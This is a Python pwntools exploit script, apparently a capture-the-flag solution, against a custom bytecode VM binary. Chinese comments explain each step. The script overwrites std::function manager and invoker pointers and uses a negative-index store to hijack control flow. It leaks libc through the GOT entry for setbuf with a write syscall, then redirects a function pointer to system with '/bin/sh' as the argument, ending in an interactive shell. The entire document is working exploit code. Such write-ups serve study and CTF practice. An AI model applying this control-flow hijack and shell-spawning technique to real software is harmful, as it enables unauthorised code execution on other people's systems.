#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

filename = "pwn"
libcname = "/home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 53215
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
'''

def start():
    if args.P:
        return process(elf.path)
    elif args.R:
        return remote(host, port)
    else:
        return gdb.debug(elf.path, gdbscript = gs)


io = start()

# pwn :)
def code_end():
    code = b'\x00'
    return code

def _exit():
    code = b'\x05'
    return code

def syscall():
    code = b'\x04'
    return code

def store_reg(addr, r1):
    code = b'\x02' + b'\x20' + p8(addr) + p8(r1)
    return code

def load_to_reg(addr, r1):
    code = b'\x02' + b'\x21' + p8(addr) + p8(r1)
    return code

def push(imm):
    code = b'\x01' + b'\x10' + p8(0) + p64(imm)[::-1]
    return code # 这里是大端序读取

def pop_to_reg(r1):
    code = b'\x01' + b'\x11' + p8(r1)
    return code

def set_reg(r1, imm):
    return push(imm) + pop_to_reg(r1)

RAX = 0
RDI = 1
RSI = 2
RDX = 3

io.recvuntil(b'input your code: ')
code = _exit()
code += push(0)
io.sendline(code)
io.recvuntil(b'set your exit code')
io.sendline(b'a'*0x14 + p64(0)*2 + p64(1) + p64(0x4025bd)) # 覆盖 stack_func 的 _M_manager 和 _M_invoker
# std::function 相关源码

# using _Invoker_type = _Res (*)(const _Any_data&, _ArgTypes&&...);

# operator()(_ArgTypes... __args) const
# {
# if (_M_empty())
#     __throw_bad_function_call();
# return _M_invoker(_M_functor, std::forward<_ArgTypes>(__args)...);
# }
# bool _M_empty() const { return !_M_manager; }
# 于是覆盖 _M_manager 不为 0, _M_invoker 改为 main 函数, 重启一个新的 vm
io.recvuntil(b'set your exit code') # 上面输入的退出码不是 -1 会再次调用 exit_func
io.sendline(b'-1') # 这里随便输入即可, 后续调用 stack_func 会重启一个vm
io.recvuntil(b'input your code: ') # 这里是新的 vm

main = 0x4025bd
code = set_reg(0, main)
code += store_reg(0xff, 0) # 负溢出覆盖 exit_func 的 _M_invoker 指针为 main
code += set_reg(RAX, 1)
code += set_reg(RDI, 1)
code += set_reg(RSI, elf.got["setbuf"])
code += set_reg(RDX, 0x8) # 利用 write 系统调用 leak libc
code += syscall() # syscall_func 执行后若 exit_code 不是-1会执行 exit_func, 再次重启一个 vm
io.sendline(code)

io.recvuntil(b'try it.\n')
libc_base = u64(io.recv(8)) - libc.sym["setbuf"]
log.info("libc_base --> "+hex(libc_base))
system = libc_base + libc.sym["system"]

io.recvuntil(b'input your code: ')
code = set_reg(0, 0x0068732F6E69622F)
code += store_reg(0xfc, 0) # 将 /bin/sh 写入 exit_func 的 _M_functor 作为 _M_invoker 的第一个参数
code += set_reg(0, system)
code += store_reg(0xff, 0) # 将 exit_func的 _M_invoker 覆盖为 system
code += _exit()

io.sendline(code)

io.interactive()
